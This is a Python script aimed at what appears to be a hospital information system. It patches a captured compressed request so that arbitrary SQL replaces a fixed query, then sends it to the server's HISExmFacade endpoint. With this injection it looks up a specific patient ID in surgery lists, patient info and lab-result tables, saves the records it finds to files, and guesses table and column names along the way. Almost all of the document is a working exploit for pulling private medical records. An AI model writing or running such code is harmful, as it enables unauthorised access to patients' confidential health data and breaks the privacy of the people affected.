from his_client_final import HISClient
import requests
import zlib
import re

class IdResolver(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

resolver = IdResolver()

# 1. Get Surgery List to find Name for 003617083J
print("1. Fetching Surgery List to find Name...")
# Use default date (today)
surgeries = resolver.get_surgery_list()
target_id = '003617083J'
target_name = None

if surgeries:
    print(f"[+] Retrieved {len(surgeries)} surgeries.")
    if len(surgeries) > 0:
        print(f"[*] Keys in first item: {list(surgeries[0].keys())}")
        
    for s in surgeries:
        # Check all values for the ID
        found = False
        for k, v in s.items():
            if target_id in str(v):
                target_name = s.get('PAT_NAME') or s.get('OR_PAT_NAME') or s.get('patient') # Try common keys
                # If specific key not found, look for name-like fields?
                # Let's just dump the record if found
                print(f"[+] Found ID in record: {s}")
                with open("found_record.txt", "w", encoding="utf-8") as f:
                    f.write(str(s))
                
                 # Heuristic to find name
                for key in s.keys():
                    if 'NAME' in key and len(s[key]) > 1: # PAT_NAME, OR_PAT_NAME
                        target_name = s[key]
                        print(f"    [?] Potential Name from {key}: {target_name}")
                found = True
                break
        if found: break
else:
    print("[-] No surgeries returned.")

# Check PAT_INFO as well
print(f"\n4. Checking PAT_INFO for {target_id}...")
try:
    sql_pat = f"SELECT * FROM PAT_INFO WHERE PAT_ID = '{target_id}' OR PAT_NO = '{target_id}'" # Guessing column names
    # Or BAS_PATIENT
    res_pat = resolver.execute_sql(sql_pat)
    if res_pat and "<NewDataSet>" in res_pat:
        print("[+] Found in PAT_INFO!")
        with open("found_pat_info.txt", "w", encoding="utf-8") as f:
            f.write(res_pat)
    else:
        print("[-] Not found in PAT_INFO (or table/col invalid).")
except:
    pass

if target_name:
    print(f"[+] Identified Patient Name: {target_name}")
else:
    print("[-] Patient ID not found in surgery list.")
    # Attempt to query PAT_INFO directly?
    # Or just try to search by generic name if known?
    # The user request has no name.
    pass

# 2. Search PAT_RESULTH by Alt ID
print(f"\n2. Searching PAT_RESULTH for AltID = {target_id}...")
sql_alt = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ALTID = '{target_id}' AND ROWNUM <= 5"
res_alt = resolver.execute_sql(sql_alt)
if res_alt and "<NewDataSet>" in res_alt:
    print("[+] Found records by Alt ID!")
    print(res_alt[:500])
else:
    print("[-] No records found by Alt ID.")

# 3. Search PAT_RESULTH by Name (if found)
if target_name:
    print(f"\n3. Searching PAT_RESULTH for Name = {target_name}...")
    # Careful with encoding. 
    # Logic: ORACLE might require specific encoding.
    # The Facade usually handles UTF-8 or Big5? 
    # Let's try raw string first.
    sql_name = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_NAME = '{target_name}' AND ROWNUM <= 5"
    res_name = resolver.execute_sql(sql_name)
    if res_name and "<NewDataSet>" in res_name:
         print("[+] Found records by Name!")
         print(res_name[:500])
    else:
         print("[-] No records found by Name.")
